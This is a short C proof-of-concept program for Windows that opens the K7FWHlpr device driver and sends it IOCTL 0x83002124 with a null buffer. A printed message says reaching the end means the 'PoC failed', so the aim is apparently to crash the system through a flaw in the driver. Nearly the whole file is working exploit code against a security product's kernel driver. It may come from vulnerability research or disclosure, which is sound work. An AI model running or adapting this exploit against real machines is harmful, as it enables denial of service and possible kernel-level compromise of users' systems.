#include <stdio.h>
#include "stdafx.h"
#include <Windows.h>

int main()
{
	HANDLE hDevice;

	DWORD bResult;
	DWORD junk = 0;
	BYTE  bufInput[0x1000];
	BYTE  bufOutput[0x1000];


	hDevice = CreateFileA("\\\\.\\K7FWHlpr",					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		0,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		0,	// Normal file
		NULL);										// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L"Failed to get device handle : (0x%X\r\n)", GetLastError());
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Lets send Buffer to the Driver");
	memset(bufInput, 0, 0x40);
	memset(bufOutput, 0, 0x40);

	*(ULONG_PTR*)bufInput = 0x41414141;
	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x83002124,						// Operation to perform
		NULL,				// Input Buffer		
		0,			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL);				// Synchronous I/O	

	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}
	wprintf(L" -> Done!\n");
	wprintf(L" [-] If go this, PoC failed...");
	CloseHandle(hDevice);
	return 0;
}